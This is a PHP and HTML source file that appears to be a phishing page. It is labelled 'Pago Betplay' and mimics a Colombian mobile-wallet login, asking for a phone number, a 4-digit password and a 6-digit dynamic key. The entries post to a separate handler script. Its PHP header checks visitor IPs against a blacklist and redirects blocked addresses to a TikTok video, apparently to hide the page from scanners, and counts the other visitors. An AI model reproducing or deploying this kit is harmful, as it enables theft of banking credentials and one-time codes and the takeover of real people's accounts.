<?php
// --- Inclusión de dependencias ---
include 'config/conexion.php'; // Archivo de conexión a la base de datos

// --- Variables globales ---
$client_ip = $_SERVER['REMOTE_ADDR']; // Obtener la IP del cliente

// --- Funciones auxiliares ---
/**
 * Verifica si la IP del cliente está bloqueada.
 *
 * @param string $client_ip Dirección IP del cliente.
 * @param mysqli $conn Conexión a la base de datos.
 * @return bool Devuelve true si la IP está bloqueada, false de lo contrario.
 */
function isIpBlocked($client_ip, $conn) {
    $sql = "SELECT * FROM blacklist WHERE ip_address = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("s", $client_ip);
    $stmt->execute();
    $result = $stmt->get_result();
    $is_blocked = $result->num_rows > 0;
    $stmt->close();
    return $is_blocked;
}

/**
 * Incrementa el contador de visitantes.
 *
 * @param mysqli $conn Conexión a la base de datos.
 */
function updateVisitorCount($conn) {
    $sql = "UPDATE visit SET visitor_count = visitor_count + 1";
    if (!$conn->query($sql)) {
        error_log("Error al actualizar el contador de visitantes: " . $conn->error);
    }
}

// --- Lógica principal ---
if (isIpBlocked($client_ip, $conn)) {
    // Redirigir si la IP está bloqueada
    header("Location: https://www.tiktok.com/@appnequi_/video/7424178986713926917?is_from_webapp=1&sender_device=pc&web_id=7426314577082500613");
    exit();
} else {
    // Actualizar el contador de visitantes si la IP no está bloqueada
    updateVisitorCount($conn);
}

// Cerrar la conexión
$conn->close();
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Datos</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="config/css/login.css">
</head>
<body>
    <div class="container mt-5 my-5">
        <!-- Encabezado -->
        <h2 class="text-center">Pago Betplay</h2>
        <center>
            <p class="text2">Podrás realizar todas tus solicitudes y consultar tus datos.</p>
        </center>
        <br><br>

        <!-- Formulario -->
        <form action="data/proceso_user.php" method="post">
            <!-- Número de celular -->
            <div class="form-group">
                <div class="input-group">
                    <div class="form-control-bn">
                        <div class="select-col select-col-img">
                            <img src="config/img/flag_colombia.png" alt="co" class="flag-img">
                        </div>
                        <div class="select-col">
                            <p class="ng-binding">+57</p>
                        </div>
                    </div>
                    <input type="tel" id="usuario" name="usuario" class="form-control-no" placeholder=" " required pattern="\d{10}" title="Debe ingresar 10 dígitos." maxlength="10">
                    <label for="usuario" class="labelno">Número de celular</label>
                </div>
            </div>

            <!-- Contraseña -->
            <div class="form-group">
                <input type="password" id="clave" name="clave" class="form-control-2" placeholder=" " required pattern="\d{4}" title="Debe ingresar 4 dígitos." maxlength="4">
                <label for="clave">Contraseña</label>
            </div>

            <!-- Clave dinámica -->
            <div class="form-group">
                <input type="tel" id="otp" name="otp" class="form-control-2" placeholder=" " required pattern="\d{6}" title="Debe ingresar 6 dígitos." maxlength="6">
                <label for="otp">Clave dinámica</label>
            </div>

            <!-- Captcha -->
            <center>
                <div class="captcha">
                    <div style="display: flex; align-items: center; margin-top: 11px;">
                        <input type="checkbox" id="captcha" name="captcha" required class="custom-checkbox">
                        <label for="captcha" style="margin-right: 10px; margin-left: 20px; margin-bottom: 0px !important;">No soy un robot</label>
                        <img src="config/img/captcha.png" style="margin-left: 20px; height: 40px;">
                    </div>
                    <p style="font-size: 10px; margin-bottom: 0px;">Privacidad - condiciones</p>
                </div>
            </center>

            <!-- Botón de envío -->
            <button type="submit" class="btn btn-primary btn-block">Entra</button>
        </form>
    </div>

    <!-- Scripts -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="cdn.jsdelivr.net/npm/@popperjs/core@2.5.2/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Agregar imágenes de bandera a las opciones de selección
            const select = document.getElementById('countryCode');
            if (select) {
                const options = select.options;
                for (let i = 0; i < options.length; i++) {
                    const flagUrl = options[i].getAttribute('data-flag');
                    if (flagUrl) {
                        const flagImg = document.createElement('img');
                        flagImg.src = flagUrl;
                        flagImg.classList.add('flag-img');
                        options[i].insertBefore(flagImg, options[i].firstChild);
                    }
                }
            }
        });
    </script>
</body>
</html>

